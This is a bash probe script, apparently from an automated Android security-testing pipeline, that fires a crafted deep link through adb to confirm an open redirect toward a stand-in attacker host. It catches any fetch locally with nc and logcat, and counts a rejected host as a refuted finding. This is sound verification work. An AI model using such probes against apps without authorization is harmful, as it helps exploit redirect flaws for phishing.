#!/usr/bin/env bash
# Copyright 2026 Anthropic PBC
# SPDX-License-Identifier: Apache-2.0
#
# deeplink_probe.sh — promote a deeplink open-redirect finding by OBSERVING the
# app act on an attacker-controlled host.
#   plan:       adb_deeplink_probe          (find_to_fuzz.py _PLAN_PLAYBOOK)
#   capability: deeplink_applink            (android:deeplink-open-redirect)
#   tier:       A (light_adb) — earns strength 2.
#
# What it promotes: a strength-1 static argument "the VIEW handler for <scheme>://
# takes the URL host from the deep link and loads/forwards it without an allowlist"
# into a strength-2 dynamic_observation — by firing the deep link and watching the
# app REDIRECT to the attacker host (load it into a WebView, or hand it to a browser
# via an implicit VIEW Intent). The redirect *decision* is the sink; it is
# observable even though sandbox egress is blocked and the page never loads.
#
# A handler that VALIDATES the host and refuses it = GUARD_BLOCKED=true → the path
# is REFUTED (guard_held), a correctness WIN — reported honestly, not as a hit.
set -u

# ─────────────────────────── <PLACEHOLDERS> ───────────────────────────────────
# Read the <intent-filter> in AndroidManifest.xml for the scheme/host it registers.
PKG="<pkg>"                         # e.g. com.example.app
SCHEME="<scheme>"                  # custom scheme (e.g. exampleapp) or https for an App Link
ATTACKER_HOST="<attacker_host>"    # a host the app must NOT trust (e.g. evil.attacker.test)
DL_PATH="<path>"                   # e.g. /redirect  (leave empty for none)
DL_PARAMS="<params>"               # e.g. url=https://evil.attacker.test/x&next=... (query, no leading ?)
# The redirect target the app forwards to. Point it at the loopback catcher below
# so an actual load is caught locally with no egress; the ATTACKER_HOST above is
# what the app decides to trust.
REDIRECT_URL="http://127.0.0.1:$((0))/pwn"   # rewritten below to the reverse port
# A logcat regex proving the app acted on the attacker host: an ActivityTaskManager
# handoff (START u0 {... dat=...ATTACKER_HOST...}) or a WebView loadUrl of it.
SINK_RE="<sink_marker_regex>"      # e.g. START u0 .*dat=.*<attacker_host>|loadUrl.*<attacker_host>
# ───────────────────────────────────────────────────────────────────────────────

ATTEMPTS=3
SETTLE=2
CATCH_PORT=8091                    # local sink: adb reverse → nc listener (egress-free)
REDIRECT_URL="http://127.0.0.1:${CATCH_PORT}/pwn?from=${ATTACKER_HOST}"
# Guard signatures: the handler rejecting the untrusted host = path refuted.
DENY_RE='SecurityException|host not allowed|invalid url|blocked|Permission Denial|rejected|not exported'

URI="${SCHEME}://${ATTACKER_HOST}/${DL_PATH#/}"
[ -n "$DL_PARAMS" ] && URI="${URI}?${DL_PARAMS}"

if ! adb get-state >/dev/null 2>&1; then
  printf '### OBSERVATION (feeds promote.py :: Observation) ###\n'
  printf 'EFFECT_OBSERVED=false\nRUNS=0\nOF_RUNS=0\nGUARD_BLOCKED=false\nDEVICE_AVAILABLE=false\nEVIDENCE=no adb device/emulator\n'
  exit 0
fi

# Optional loopback catcher: if the app actually fetches the redirect, this
# records the hit locally (no network egress needed). Best-effort; logcat is the
# primary oracle when nc/reverse are unavailable.
adb reverse "tcp:${CATCH_PORT}" "tcp:${CATCH_PORT}" >/dev/null 2>&1 || true

drive() {
  # am start VIEW with the crafted deep link, as the unprivileged shell uid.
  adb shell am start -a android.intent.action.VIEW -d "$URI" "$PKG" 2>&1
}

hits=0; guard=false; evidence=""
for i in $(seq 1 "$ATTEMPTS"); do
  adb logcat -c >/dev/null 2>&1
  # start a one-shot local catcher for this attempt (records an actual fetch)
  catch="$(mktemp)"; ( nc -l "$CATCH_PORT" >"$catch" 2>/dev/null & echo $! >"$catch.pid" ) 2>/dev/null || true
  out="$(drive)"
  if printf '%s' "$out" | grep -qiE "$DENY_RE"; then
    guard=true; evidence="$(printf '%s' "$out" | grep -iE "$DENY_RE" | head -1)"
    kill "$(cat "$catch.pid" 2>/dev/null)" 2>/dev/null; rm -f "$catch" "$catch.pid"; continue
  fi
  sleep "$SETTLE"
  # OBSERVE: the app forwarded/loaded the attacker host (logcat), or the loopback
  # catcher saw the actual request — either proves the redirect decision fired.
  line="$(adb logcat -d -v brief 2>/dev/null | grep -aiE "$SINK_RE" | tail -1)"
  [ -z "$line" ] && [ -s "$catch" ] && line="loopback-fetch: $(head -1 "$catch")"
  kill "$(cat "$catch.pid" 2>/dev/null)" 2>/dev/null; rm -f "$catch" "$catch.pid"
  if [ -n "$line" ]; then hits=$((hits+1)); evidence="$line"; fi
done
adb reverse --remove "tcp:${CATCH_PORT}" >/dev/null 2>&1 || true

effect=false; [ "$hits" -gt 0 ] && effect=true
printf '### OBSERVATION (feeds promote.py :: Observation) ###\n'
printf 'EFFECT_OBSERVED=%s\nRUNS=%s\nOF_RUNS=%s\nGUARD_BLOCKED=%s\nDEVICE_AVAILABLE=true\nEVIDENCE=%s\n' \
  "$effect" "$hits" "$ATTEMPTS" "$guard" "${evidence:-none}"

# effect + 3/3     → promoted, dynamic_observation strength 2 (behavior): open redirect
# guard_blocked    → guard_held (host allowlist held — REFUTED, a correctness win)
# effect but <3    → contested (flaky); no effect, no guard → contested / try Tier B (Frida in-WebView)
